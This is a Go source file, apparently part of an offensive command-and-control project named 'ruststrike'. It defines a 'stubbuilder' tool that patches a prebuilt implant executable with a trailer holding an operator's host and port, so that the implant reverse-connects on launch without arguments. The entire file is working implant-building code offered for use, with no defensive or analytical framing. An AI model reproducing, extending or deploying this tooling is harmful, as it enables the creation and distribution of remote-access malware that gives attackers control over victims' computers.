// Command stubbuilder appends a host:port config trailer to a prebuilt
// ruststrike-implant.exe so it reverse-connects without CLI args.
//
// Usage:
//
//	stubbuilder <base-implant.exe> <out.exe> <host> <port>
//
// The trailer layout (matching crates/implant/src/main.rs::read_trailer_config):
//
//	<exe bytes>... "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"
//
// The implant reads the last ~512 bytes of its own exe at startup to find the
// magic; if absent it falls back to args[1]/args[2]. Re-running on an already-
// patched exe strips the old trailer first (no accumulation).
//
// Build:
//
//	go build -o stubbuilder ./tools/stubbuilder
package main

import (
	"bytes"
	"fmt"
	"os"
)

var magic = []byte("RUSTSTRIKE\x01")

func main() {
	if len(os.Args) != 5 {
		fmt.Fprintf(os.Stderr, "usage: %s <base-implant.exe> <out.exe> <host> <port>\n", os.Args[0])
		os.Exit(2)
	}
	base, out, host, port := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
	if err := build(base, out, host, port); err != nil {
		fmt.Fprintf(os.Stderr, "stubbuilder: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("wrote %s (%s:%s)\n", out, host, port)
}

func build(base, out, host, port string) error {
	raw, err := os.ReadFile(base)
	if err != nil {
		return fmt.Errorf("read base: %w", err)
	}
	raw = stripTrailer(raw)
	buf := bytes.NewBuffer(raw)
	if _, err := buf.Write(magic); err != nil {
		return err
	}
	if _, err := buf.WriteString(host); err != nil {
		return err
	}
	if err := buf.WriteByte(0); err != nil {
		return err
	}
	if _, err := buf.WriteString(port); err != nil {
		return err
	}
	if err := buf.WriteByte(0); err != nil {
		return err
	}
	return os.WriteFile(out, buf.Bytes(), 0o755)
}

// stripTrailer removes a prior trailer so an exe can be re-patched cleanly.
func stripTrailer(raw []byte) []byte {
	window := 512
	if len(raw) < window {
		window = len(raw)
	}
	tail := raw[len(raw)-window:]
	idx := bytes.LastIndex(tail, magic)
	// LastIndex matches magic anywhere; but magic must be a full sub-slice —
	// bytes.LastIndex does substring search, which is what we want.
	if idx < 0 {
		// also try a forward search in the window (covers magic spanning)
		idx = bytes.Index(tail, magic)
	}
	if idx < 0 {
		return raw
	}
	cutAt := len(raw) - window + idx
	return raw[:cutAt]
}
